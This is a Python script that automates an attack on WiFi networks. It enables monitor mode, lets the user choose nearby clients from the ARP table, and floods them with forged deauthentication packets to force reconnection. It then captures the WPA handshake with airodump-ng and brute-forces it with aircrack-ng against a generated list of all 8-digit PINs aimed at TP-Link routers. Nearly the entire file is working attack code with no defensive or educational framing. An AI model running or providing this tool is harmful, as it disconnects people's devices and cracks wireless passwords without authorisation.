import os
import subprocess
import re
import time
import shutil
from scapy.all import *
from scapy.layers.dot11 import *

def setup_network()->None:
    print(f"[!] Setting up network interface to allow for WiFi attacks...")
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout = subprocess.DEVNULL)
    subprocess.run(['airmon-ng', 'start', 'wlan1'], stdout = subprocess.DEVNULL)

def teardown_network()->None:
    print(f"[!] Reverting back network interface changes...")
    subprocess.run(['airmon-ng', 'stop', 'wlan1mon'], stdout = subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', 'wlan1', 'down'], stdout = subprocess.DEVNULL)
    subprocess.run(['iw', 'wlan1', 'set', 'type', 'managed'], stdout = subprocess.DEVNULL)
    subprocess.run(['systemctl', 'start', 'NetworkManager'], stdout = subprocess.DEVNULL)

def get_iface()->str:
    try:
        result = subprocess.run(['ip', '-o', 'link', 'show'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'mon' in line:
                match = re.search(r'^\d+:\s+([^:]+):', line)
                if match:
                    return match.group(1).strip()
    except Exception as e:
        print(f"[-] Error: {e}")
    return None

def get_local_devices() -> list:
    subprocess.run(['ping', '-c', '3', '192.168.0.100'], stdout=subprocess.DEVNULL)
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    for i, line in enumerate(lines):
        print(f"{i}. {line}")

    selection = input("[!] List the clients you want removed: ")  
    selected_indices = [int(x.strip()) for x in selection.split(',')]
    bssids = []
    for idx in selected_indices:
        if 0 <= idx < len(lines):
            match = re.search(r'(([0-9a-fA-F]{1,2}[:\-]){5}[0-9a-fA-F]{1,2})', lines[idx])
            if match:
                bssids.append(match.group(1))
    return bssids

def generate_wordlist() -> str:
    filename = "TP-Link-Pins.txt"
    if os.path.exists(filename):
        return filename
    with open(filename, 'w') as f:
        for i in range(100000000):
            f.write(f"{i:08d}\n")
    print(f"Created {filename} with pins")
    return filename

def send_deauth(bssid: str, client_list:list, channel: int)-> None:
    i_face = get_iface()
    subprocess.run(['iwconfig', i_face, 'channel', str(channel)])
    for client in client_list:
        print(f"Sending 35 deauth requests to {client} with bssid: {bssid}")
        dot11 = Dot11(addr1=client, addr2=bssid,addr3=bssid)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        sendp(packet, inter=0.1, count=35, iface=i_face, verbose=1)

def capture_handshake(bssid: str, channel: int, ssid: str, client_list: list)-> str:

    i_face = get_iface()

    os.makedirs('./handshake', exist_ok=True)
    capture_file = f"./handshake/handshake-{ssid}-{bssid.replace(':', '')}"
    
    subprocess.run(['killall', 'airodump-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    airodump_cmd = ['airodump-ng', '--bssid', bssid, '-c', str(channel), '-w', capture_file, '--output-format', 'pcap', i_face]
    
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    
    send_deauth(bssid, client_list, channel)
    
    print(f"Giving client time to reconnect...")
    time.sleep(15)
    handshake_detected = False
    cap_file = f"{capture_file}-01.cap"
    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
        try:
            packets = rdpcap(cap_file)
            eapol_count = sum(1 for p in packets if EAPOL in p)
            if eapol_count >= 4:
                handshake_detected = True
                print(f"[+] Handshake detected! ({eapol_count} EAPOL packets)")
        except:
            pass
        
    airodump_proc.terminate()
    time.sleep(2)
    
    if handshake_detected:
        cap_file = f"{capture_file}-01.cap"
        print(f"[+] Handshake captured successfully!")
        print(f"[+] Saved to: {cap_file}")
        return cap_file
    else:
        print("[-] No handshake detected")
        return None

def crack_handshake_aircrack(pcap_file: str, wordlist: str) -> str:
    print(f"\n[*] Attempting to crack the SSID Pin now, this might take a while...")
    print(f"[*] Wordlist: {wordlist}")
    
    cmd = ['aircrack-ng', '-w', wordlist, pcap_file]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr

        for line in output.splitlines():
            if 'KEY FOUND' in line or 'PASSWORD' in line.upper():
                match = re.search(r'\[\s*([^\]]+)\s*\]', line)
                if match:
                    password = match.group(1).strip()
                    return password
            elif 'Password:' in line or 'passphrase:' in line.lower():
                match = re.search(r'Password:\s*(\S+)|passphrase:\s*(\S+)', line, re.IGNORECASE)
                if match:
                    password = match.group(1) or match.group(2)
                    print(f"[+] PASSWORD FOUND: {password}")
                    return password
        
        print(output)
        print("\n[-] Password not found in wordlist")
        return None
        
    except subprocess.TimeoutExpired:
        print("[-] aircrack-ng timed out")
        return None
    except Exception as e:
        print(f"[-] Error running aircrack-ng: {e}")
        return None

def handshake_attack(bssid: str, channel: int, ssid: str, client_list: list, wordlist_path: str) -> str:
    print(f"\n{'='*60}")
    print(f"Starting Handshake Attack on {ssid}")
    print(f"{'='*60}\n")
    
    setup_network()
    
    i_face = get_iface()
    
    pcap_file = capture_handshake(bssid, channel, ssid, client_list)
    
    if not pcap_file:
        print("[-] Handshake capture failed")
        teardown_network()
        return None
    
    password = crack_handshake_aircrack(pcap_file, wordlist_path)

    teardown_network()
    shutil.rmtree('handshake')
    return password